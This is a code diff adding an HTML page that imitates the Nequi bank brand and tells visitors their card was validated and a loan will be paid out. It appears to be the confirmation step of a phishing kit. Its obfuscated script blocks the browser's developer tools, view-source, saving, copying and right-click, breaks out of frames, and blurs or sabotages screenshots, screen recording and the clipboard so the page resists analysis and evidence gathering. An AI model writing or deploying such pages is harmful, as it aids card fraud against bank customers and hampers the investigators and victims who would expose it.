@@ -1,0 +1,78 @@
+<!doctype html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Tarjeta aprobada - Nequi</title><style>* { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: system-ui, -apple-system, Arial, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #200020;
+    }
+    .container {
+      background: white;
+      border-radius: 16px;
+      padding: 40px 30px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    }
+    .check {
+      width: 70px;
+      height: 70px;
+      background: #00C853;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 36px;
+      color: white;
+    }
+    h1 { font-size: 22px; margin-bottom: 12px; }
+    p { font-size: 15px; color: #555; line-height: 1.5; }</style></head><body><div class="container"><div class="check">✓</div><h1>¡Tarjeta validada correctamente!</h1><p>Tu crédito está siendo procesado.<br>Recibirás el desembolso en breve.</p></div><script>(function(){
+'use strict';
+var _0xa1=0;
+document.addEventListener('touchend',function(_0xb2){
+var _0xc3=new Date().getTime();
+if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
+_0xa1=_0xc3;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
+document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xf6){
+var _0xg7=(_0xf6.key||'').toLowerCase();
+var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
+var _0xi9=_0xf6.shiftKey;
+if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='p'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='a'){_0xf6.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
+document.addEventListener('selectstart',function(_0xl1){_0xl1.preventDefault();});
+document.addEventListener('copy',function(_0xm2){_0xm2.preventDefault();return false;});
+document.addEventListener('cut',function(_0xn3){_0xn3.preventDefault();return false;});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xo4){document.body.innerHTML='';}
+function _0xq6(){
+    document.documentElement.style.filter='blur(20px)';
+    document.documentElement.style.transition='filter 0.1s';
+    setTimeout(function(){document.documentElement.style.filter='';},1500);
+}
+window.addEventListener('keyup',function(_0xr7){
+    var _0xs8=_0xr7.key||''; var _0xt9=_0xs8.toLowerCase();
+    if(_0xt9==='printscreen'||_0xr7.keyCode===44){_0xq6();if(navigator.clipboard&&navigator.clipboard.writeText){try{navigator.clipboard.writeText('');}catch(e){}}}
+    if(_0xr7.metaKey&&_0xr7.shiftKey&&_0xt9==='s'){_0xq6();}
+    if(_0xr7.metaKey&&_0xt9==='printscreen'){_0xq6();}
+    if(_0xr7.metaKey&&_0xr7.shiftKey&&(_0xt9==='3'||_0xt9==='4'||_0xt9==='5')){_0xq6();}
+},{capture:true});
+var _0xu0=0;
+window.addEventListener('blur',function(){_0xu0=new Date().getTime();_0xq6();});
+window.addEventListener('focus',function(){if(_0xu0>0){var _0xv1=new Date().getTime()-_0xu0;if(_0xv1<800){_0xq6();}}});
+document.addEventListener('visibilitychange',function(){if(document.hidden){document.body.style.filter='blur(30px)';}else{document.body.style.filter='';}});
+if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){navigator.mediaDevices.getDisplayMedia=function(){_0xq6();return Promise.reject(new Error('No'));};}
+if(window.MediaRecorder){window.MediaRecorder=function(){_0xq6();throw new Error('No');};}
+if(navigator.clipboard){try{navigator.clipboard.writeText=function(){return Promise.reject();};navigator.clipboard.write=function(){return Promise.reject();};}catch(e){}}
+})();</script></body></html>
